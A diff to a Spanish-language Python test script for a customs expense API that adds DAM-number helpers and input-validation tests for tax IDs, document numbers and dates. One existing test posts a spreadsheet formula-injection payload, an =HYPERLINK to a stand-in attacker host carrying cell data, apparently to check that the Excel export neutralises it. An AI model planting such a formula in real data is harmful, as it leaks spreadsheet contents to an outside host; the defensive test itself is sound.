@@ -96,8 +96,12 @@ H = {n: tok(n) for n in users}
 
 def mk_maestro(fact, tipo="DEFINITIVO"):
     r = c.post("/maestros/", json={"numero_factura": fact, "id_importador": imp.id_importador, "tipo_valor": tipo}, headers=H["logi"]); return r.json()["id_maestro"]
+_NUMEROS_DAM = {}
+def num_dam(etiqueta):
+    """N° de DAM válido y estable para cada etiqueta de prueba ("DAM-V01" -> "118-2026-10-000001")."""
+    return _NUMEROS_DAM.setdefault(etiqueta, f"118-2026-10-{len(_NUMEROS_DAM) + 1:06d}")
 def mk_dam(idm, num, canal="VERDE"):
-    r = c.post("/dams/", json={"id_maestro": idm, "numero_de_dam": num, "canal_control": canal}, headers=H["logi"]); return r.json()["id_dam"]
+    r = c.post("/dams/", json={"id_maestro": idm, "numero_de_dam": num_dam(num), "canal_control": canal}, headers=H["logi"]); return r.json()["id_dam"]
 def mk_gasto(idd, concepto, monto, moneda="USD", doc_n=None):
     r = c.post("/gastos/", json={"id_dam": idd, "id_concepto": concepto, "id_proveedor": prov.id_proveedor, "id_tipo_doc": doc.id_tipo_doc,
                                   "monto_original": str(monto), "moneda": moneda, "numero_documento": doc_n}, headers=H["logi"])
@@ -137,7 +141,7 @@ r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE", "aforo_realizado": Tr
 chk("V01a", "Auditor no puede tocar DAMs", r.status_code == 403 and dam(d).estado_dam == "NUMERADA / EN EVALUACIÓN", f"{r.status_code} estado={dam(d).estado_dam}")
 r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE"}, headers=H["logi"])
 chk("V01b", "Logística no puede saltar NUMERADA -> CON LEVANTE", r.status_code == 400, f"{r.status_code} {det(r)}")
-r = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": "DAM-V01-B", "estado_dam": "CON LEVANTE", "aforo_realizado": True, "fecha_levante": "2026-01-01"}, headers=H["logi"])
+r = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": num_dam("DAM-V01-B"), "estado_dam": "CON LEVANTE", "aforo_realizado": True, "fecha_levante": "2026-01-01"}, headers=H["logi"])
 chk("V01c", "Crear DAM ignora estado/aforo/fecha_levante enviados", r.status_code == 200 and r.json()["estado_dam"] == "NUMERADA / EN EVALUACIÓN" and not r.json()["aforo_realizado"], f"{r.status_code} {r.json().get('estado_dam')}")
 
 m = mk_maestro("F-V02"); d = mk_dam(m, "DAM-V02"); g = mk_gasto(d, c_trib.id_concepto, 5000)
@@ -200,11 +204,11 @@ r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE"}, headers=H["logi"])
 chk("R2b", "Botón 'Aforo Conforme' -> CON LEVANTE + aforo_realizado", r.status_code == 200 and dam(d).estado_dam == "CON LEVANTE" and dam(d).aforo_realizado, f"{r.status_code} {dam(d).estado_dam} aforo={dam(d).aforo_realizado}")
 db.expire_all(); log = db.query(models.AuditLog).filter_by(accion="CAMBIO ESTADO DAM").order_by(models.AuditLog.id_log.desc()).first()
 chk("R2c", "Cambio de estado DAM queda en bitácora", log is not None and "PENDIENTE DE AFORO" in log.detalles, log.detalles if log else "sin log")
-r = c.put(f"/dams/{d}", json={"numero_de_dam": "DAM-R2", "serie": "S1", "canal_control": "ROJO", "estado_dam": "CON LEVANTE"}, headers=H["logi"])
+r = c.put(f"/dams/{d}", json={"numero_de_dam": num_dam("DAM-R2"), "serie": "S1", "canal_control": "ROJO", "estado_dam": "CON LEVANTE"}, headers=H["logi"])
 chk("R2d", "Guardar formulario completo de DAM (estado sin cambios) sigue funcionando", r.status_code == 200, str(r.status_code))
 
 m = mk_maestro("F-R3", "GARANTIZADO")
-rd = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": "DAM-R3", "canal_control": "ROJO", "monto_valor_provisional_usd": "100"}, headers=H["logi"]); d = rd.json()["id_dam"]
+rd = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": num_dam("DAM-R3"), "canal_control": "ROJO", "monto_valor_provisional_usd": "100"}, headers=H["logi"]); d = rd.json()["id_dam"]
 gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-R3"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-R3"); v = mk_voucher(100, num="OP-R3")
 pagar2(gt, v["id_voucher"], 10); pagar2(gp, v["id_voucher"], 10)
 s = [c.put(f"/dams/{d}", json={"estado_dam": e}, headers=H["logi"]).status_code for e in ["OBSERVADA / NOTIFICADA", "CON LEVANTE (GARANTÍA ACTIVA)", "EN REVISIÓN OMC (POST-LEVANTE)", "GARANTÍA CERRADA / LIQUIDADA"]]
@@ -332,7 +336,7 @@ m = mk_maestro("F-N9"); d = mk_dam(m, "DAM-N9")
 c.post("/gastos/", json={"id_dam": d, "id_concepto": c_otro.id_concepto, "id_proveedor": prov.id_proveedor, "id_tipo_doc": doc.id_tipo_doc, "monto_original": "1",
                          "observaciones": '=HYPERLINK("http://atacante.test/?d="&A1,"Ver")'}, headers=H["logi"])
 import openpyxl
-r = c.get("/gastos/exportar", params={"search": "DAM-N9"}, headers=H["audi"])
+r = c.get("/gastos/exportar", params={"search": num_dam("DAM-N9")}, headers=H["audi"])
 wb = openpyxl.load_workbook(io.BytesIO(r.content)); tipos = []; guiones_ok = True
 for ws in wb.worksheets:
     for row in ws.iter_rows():
@@ -655,9 +659,9 @@ chk("I3", "Modificar con nombre ya usado responde 400 (antes 500); id inexistent
     r_a3.status_code == 400 and r_a4.status_code == 404 and det(r_a4) == "Almacén no encontrado", f"{r_a3.status_code} {det(r_a3)} / {r_a4.status_code} {det(r_a4)}")
 
 r_p = c.post("/proveedores/", json={"nombre": "PROVEEDOR I4", "ruc": "   "}, headers=H["logi"])
-r_p2 = c.post("/proveedores/", json={"nombre": "PROVEEDOR I4B", "ruc": " 20999999994 "}, headers=H["logi"])
+r_p2 = c.post("/proveedores/", json={"nombre": "PROVEEDOR I4B", "ruc": " 20100047218 "}, headers=H["logi"])
 chk("I4", "Proveedores: RUC vacío se guarda como nulo y con espacios se recorta",
-    r_p.json().get("ruc") is None and r_p2.json().get("ruc") == "20999999994", f"{r_p.json().get('ruc')!r} / {r_p2.json().get('ruc')!r}")
+    r_p.json().get("ruc") is None and r_p2.json().get("ruc") == "20100047218", f"{r_p.json().get('ruc')!r} / {r_p2.json().get('ruc')!r}")
 
 r_f1 = c.delete(f"/bancos/{banco.id_banco}/fisico", headers=H["admin"])
 r_f2 = c.delete(f"/bancos/{id_b}/fisico", headers=H["teso"])
@@ -693,6 +697,103 @@ chk("J1", "Tras anular un pago, el gasto conserva el estado de la regla de regis
     r_j == [200, 200, 200, 400] and len(pagos_j) == 3 and r_anul.status_code == 200 and gasto(gj).estado_pago == "PARCIAL" and saldo_liq in (0.06, "0.06"),
     f"pagos={len(pagos_j)} anulación={r_anul.status_code} estado={gasto(gj).estado_pago} saldo_liquidación={saldo_liq} (liq {liq.status_code})")
 
+
+# ==========================================
+# K) VALIDACIÓN DE LO QUE SE DIGITA (fase 5)
+# ==========================================
+print("\n=========== K) VALIDACIÓN DE LO QUE SE DIGITA ===========")
+from domain.validaciones import digito_verificador_ruc
+
+
+def ruc_valido(base10):
+    return base10 + str(digito_verificador_ruc(base10))
+
+
+def mensajes(r):
+    detalle = r.json().get("detail")
+    return " | ".join(d["msg"] for d in detalle) if isinstance(detalle, list) else str(detalle)
+
+
+# K1: RUC con dígito verificador incorrecto se rechaza con un mensaje en español
+r_k1 = c.post("/importadores/", json={"nombre": "IMP K1", "ruc": "20100047219"}, headers=H["logi"])
+r_k1b = c.post("/importadores/", json={"nombre": "IMP K1B", "ruc": " 2010-0047-218 "}, headers=H["logi"])
+chk("K1", "RUC: dígito verificador incorrecto -> 422 en español; con espacios/guiones se guarda limpio",
+    r_k1.status_code == 422 and "dígito verificador" in mensajes(r_k1) and r_k1b.json().get("ruc") == "20100047218",
+    f"{r_k1.status_code} {mensajes(r_k1)[:80]} / {r_k1b.json().get('ruc')}")
+
+# K2: un agente antiguo con RUC fuera de formato se puede renombrar; cambiarle el RUC por uno inválido no
+agente_viejo = models.CatAgente(nombre="AGENTE ANTIGUO K2", ruc="123"); db.add(agente_viejo); db.commit()
+r_k2a = c.put(f"/agentes/{agente_viejo.id_agente}", json={"nombre": "AGENTE ANTIGUO K2 SAC", "ruc": "123"}, headers=H["logi"])
+r_k2b = c.put(f"/agentes/{agente_viejo.id_agente}", json={"ruc": "20999999999"}, headers=H["logi"])
+r_k2c = c.put(f"/agentes/{agente_viejo.id_agente}", json={"ruc": ruc_valido("2060000001")}, headers=H["logi"])
+chk("K2", "RUC antiguo: editar otro dato no lo exige válido; cambiarlo sí (inválido 422, válido 200)",
+    r_k2a.status_code == 200 and r_k2b.status_code == 422 and r_k2c.status_code == 200,
+    f"{r_k2a.status_code} / {r_k2b.status_code} {mensajes(r_k2b)[:60]} / {r_k2c.status_code}")
+
+# K3: proveedor del exterior admite su identificación tributaria; uno nacional exige RUC válido
+r_k3a = c.post("/proveedores/", json={"nombre": "SHIPPER K3", "ruc": "US-99", "categoria": "INTERNACIONAL"}, headers=H["logi"])
+r_k3b = c.post("/proveedores/", json={"nombre": "NACIONAL K3", "ruc": "US-99", "categoria": "NACIONAL"}, headers=H["logi"])
+chk("K3", "Proveedor del exterior guarda su identificación libre; nacional con RUC inválido -> 422",
+    r_k3a.status_code == 200 and r_k3a.json().get("ruc") == "US-99" and r_k3b.status_code == 422,
+    f"{r_k3a.status_code} {r_k3a.json().get('ruc')} / {r_k3b.status_code}")
+
+# K4: N° de DAM normalizado, repetido con mensaje claro, inválido en español
+mk4 = mk_maestro("F-K4")
+r_k4a = c.post("/dams/", json={"id_maestro": mk4, "numero_de_dam": "118-26-10-77", "canal_control": "VERDE"}, headers=H["logi"])
+r_k4b = c.post("/dams/", json={"id_maestro": mk4, "numero_de_dam": "118 2026 10 000077", "canal_control": "VERDE"}, headers=H["logi"])
+r_k4c = c.post("/dams/", json={"id_maestro": mk4, "numero_de_dam": "DAM-77", "canal_control": "VERDE"}, headers=H["logi"])
+chk("K4", "DAM: '118-26-10-77' se guarda como 118-2026-10-000077; repetida -> 400 con su contenedor; formato inválido -> 422",
+    r_k4a.json().get("numero_de_dam") == "118-2026-10-000077" and r_k4b.status_code == 400 and "F-K4" in det(r_k4b)
+    and r_k4c.status_code == 422 and "Formato esperado" in mensajes(r_k4c),
+    f"{r_k4a.json().get('numero_de_dam')} / {r_k4b.status_code} {det(r_k4b)[:60]} / {r_k4c.status_code}")
+
+# K5: una DAM antigua con otro formato se edita sin tocar su número; cambiarlo exige el formato
+dam_vieja = models.DetalleDam(id_maestro=mk4, numero_de_dam="DAM ANTIGUA K5", canal_control="VERDE"); db.add(dam_vieja); db.commit()
+r_k5a = c.put(f"/dams/{dam_vieja.id_dam}", json={"numero_de_dam": "DAM ANTIGUA K5", "serie": "S9"}, headers=H["logi"])
+r_k5b = c.put(f"/dams/{dam_vieja.id_dam}", json={"numero_de_dam": "118-2026-10-000077"}, headers=H["logi"])
+r_k5c = c.put(f"/dams/{dam_vieja.id_dam}", json={"numero_de_dam": "118-2026-10-78"}, headers=H["logi"])
+chk("K5", "DAM antigua: editar la serie no exige formato; cambiar el número a uno repetido 400, a uno válido se normaliza",
+    r_k5a.status_code == 200 and r_k5b.status_code == 400 and r_k5c.json().get("numero_de_dam") == "118-2026-10-000078",
+    f"{r_k5a.status_code} / {r_k5b.status_code} / {r_k5c.json().get('numero_de_dam')}")
+
+# K6: comprobante de proveedor nacional normalizado y validado al crear y al editar; del exterior queda libre
+prov_nac = c.post("/proveedores/", json={"nombre": "NACIONAL K6", "ruc": ruc_valido("2060000002")}, headers=H["logi"]).json()
+prov_ext = r_k3a.json()
+dk6 = mk_dam(mk4, "DAM-K6")
+def gasto_k6(proveedor, numero):
+    return c.post("/gastos/", json={"id_dam": dk6, "id_concepto": c_otro.id_concepto, "id_proveedor": proveedor["id_proveedor"],
+                                     "id_tipo_doc": doc.id_tipo_doc, "monto_original": "10", "numero_documento": numero}, headers=H["logi"])
+r_k6a = gasto_k6(prov_nac, " f001 - 5 ")
+r_k6b = gasto_k6(prov_nac, "F001123")
+r_k6c = gasto_k6(prov_nac, "F001-6")
+r_k6d = gasto_k6(prov_ext, "INV-2026/55")
+r_k6e = c.put(f"/gastos/{r_k6c.json().get('id_gasto')}", json={"numero_documento": "F001-5"}, headers=H["logi"])
+r_k6f = c.put(f"/gastos/{r_k6c.json().get('id_gasto')}", json={"numero_documento": "f001-7"}, headers=H["logi"])
+chk("K6", "Comprobante nacional: 'f001 - 5' -> F001-00000005, sin guion 422, editar a uno repetido 400 (antes se aceptaba) y se normaliza al editar; del exterior se guarda tal cual",
+    r_k6a.json().get("numero_documento") == "F001-00000005" and r_k6b.status_code == 422
+    and r_k6d.json().get("numero_documento") == "INV-2026/55" and r_k6e.status_code == 400
+    and r_k6f.json().get("numero_documento") == "F001-00000007",
+    f"{r_k6a.json().get('numero_documento')} / {r_k6b.status_code} / {r_k6d.json().get('numero_documento')} / {r_k6e.status_code} / {r_k6f.json().get('numero_documento')}")
+
+# K7: los errores de formato llegan en español y con el nombre del campo en pantalla
+r_k7a = c.post("/gastos/", json={"id_dam": dk6, "id_concepto": c_otro.id_concepto, "id_proveedor": prov_ext["id_proveedor"],
+                                "id_tipo_doc": doc.id_tipo_doc, "monto_original": "10.123"}, headers=H["logi"])
+r_k7b = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": imp.id_importador, "numero_operacion": "   ",
+                                   "monto_total": "abc", "moneda": "USD", "fecha_transferencia": "ayer"}, headers=H["teso"])
+chk("K7", "Mensajes 422 en español con el nombre del campo",
+    "Monto admite como máximo 2 decimales." in mensajes(r_k7a)
+    and "N° de operación: no puede quedar vacío." in mensajes(r_k7b) and "Monto del voucher debe ser un número" in mensajes(r_k7b)
+    and "Fecha de transferencia no es una fecha válida" in mensajes(r_k7b),
+    f"{mensajes(r_k7a)[:60]} / {mensajes(r_k7b)[:110]}")
+
+# K8: expediente con fechas al revés o factura repetida
+r_k8a = c.post("/maestros/", json={"numero_factura": "F-K8", "fecha_embarque": "2026-03-10", "fecha_arribo": "2026-03-01"}, headers=H["logi"])
+r_k8b = c.post("/maestros/", json={"numero_factura": " F-K4 "}, headers=H["logi"])
+r_k8c = c.put(f"/maestros/{mk4}", json={"fecha_embarque": "2026-03-10", "fecha_arribo": "2026-03-01"}, headers=H["logi"])
+chk("K8", "Expediente: arribo antes que embarque -> 422 (al crear y al editar); factura repetida -> 400 con mensaje (antes 500)",
+    r_k8a.status_code == 422 and "arribo" in mensajes(r_k8a) and r_k8b.status_code == 400 and "F-K4" in det(r_k8b)
+    and r_k8c.status_code == 422,
+    f"{r_k8a.status_code} / {r_k8b.status_code} {det(r_k8b)[:50]} / {r_k8c.status_code}")
 
 # ==========================================
 # 4. PRUEBA DE CONCURRENCIA REAL (PostgreSQL)
